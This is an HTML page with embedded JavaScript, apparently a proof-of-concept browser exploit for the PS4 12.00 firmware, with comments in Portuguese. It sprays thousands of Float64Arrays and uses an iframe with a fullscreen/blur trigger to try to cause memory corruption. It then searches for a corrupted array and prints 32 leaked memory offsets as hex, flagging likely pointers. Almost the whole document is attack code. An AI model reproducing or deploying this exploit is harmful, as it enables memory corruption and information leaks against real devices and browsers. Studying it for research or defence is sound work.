<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Deep Dump - Leandro</title>
</head>
<body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">

    <h1>PS4 12.00 - Deep Memory Dump</h1>
    <p>Status: <span id="status-pai" style="font-weight:bold;">Aguardando...</span></p>

    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Objetos (Janela 32)</button>
    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe de Sucesso</button>
    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Varredura Profunda (0-31)</button>

    <hr>
    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 12px;"></div>

    <div id="frame-container" style="margin-top: 20px;"></div>

    <script>
        const PATTERN = 2.121995791e-314; 
        let controllers = [];
        const statusPai = document.getElementById('status-pai');
        const leakOutput = document.getElementById('leak-output');

        function prepareObjects() {
            controllers = [];
            // Aumentamos o tamanho de cada array para 32 para poder logar mais offsets
            for(let i = 0; i < 5000; i++) {
                let arr = new Float64Array(32); 
                arr[0] = i; 
                controllers.push(arr);
            }
            statusPai.innerText = "5000 Objetos (Tamanho 32) prontos.";
            statusPai.style.color = "blue";
            leakOutput.style.display = "none";
        }

        function setupIframe() {
            const container = document.getElementById('frame-container');
            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
            
            const frame = document.getElementById('pocFrame');
            const fDoc = frame.contentWindow.document;

            fDoc.open();
            fDoc.write(`
                <html>
                <body>
                    <button onclick="startPoC()" style="padding:10px;">START (FS + OPTIONS)</button>
                    <script>
                        window.startPoC = function() {
                            if (document.documentElement.webkitRequestFullscreen) 
                                document.documentElement.webkitRequestFullscreen();
                            
                            window.onblur = function() {
                                let spray = [];
                                for(let i = 0; i < 8000; i++) {
                                    // Spray continua com tamanho 10 para manter a colisão que funcionou
                                    let p = new Float64Array(10).fill(${PATTERN});
                                    spray.push(p);
                                }
                                setTimeout(() => {
                                    document.open();
                                    document.write('<h1>FINALIZADO</h1>');
                                    document.close();
                                }, 1000);
                            };
                        };
                    <\/script>
                </body>
                </html>
            `);
            fDoc.close();
        }

        function checkPersistence() {
            let corrupted = null;
            let corruptedIndex = -1;

            for(let i = 0; i < controllers.length; i++) {
                if (controllers[i][0] === PATTERN) {
                    corrupted = controllers[i];
                    corruptedIndex = i;
                    break;
                }
            }

            if (corrupted) {
                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: Corrupção no ID: " + corruptedIndex + "</span>";
                leakOutput.style.display = "block";
                leakOutput.innerHTML = "<b>[ DEEP MEMORY DUMP ]</b><br><br>";

                // Agora logamos 32 posições (0 a 31)
                for(let i = 0; i < 32; i++) {
                    const val = corrupted[i];
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
                    
                    let isPointer = (hex !== "0000000000000000" && !hex.includes("414141") && hex !== "0000000000000000");
                    let style = isPointer ? "color:#fff; background:#a00;" : "";
                    
                    // Adiciona uma quebra de linha a cada 4 offsets para facilitar a leitura
                    let br = (i % 4 === 3) ? "<br>" : "";
                    leakOutput.innerHTML += "Offset [" + i + "]: <span style='" + style + "'>0x" + hex + "</span> | " + br;
                }
            } else {
                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: Corrupção não detectada. Tente novamente.</span>";
            }
        }
    </script>
</body>
</html>
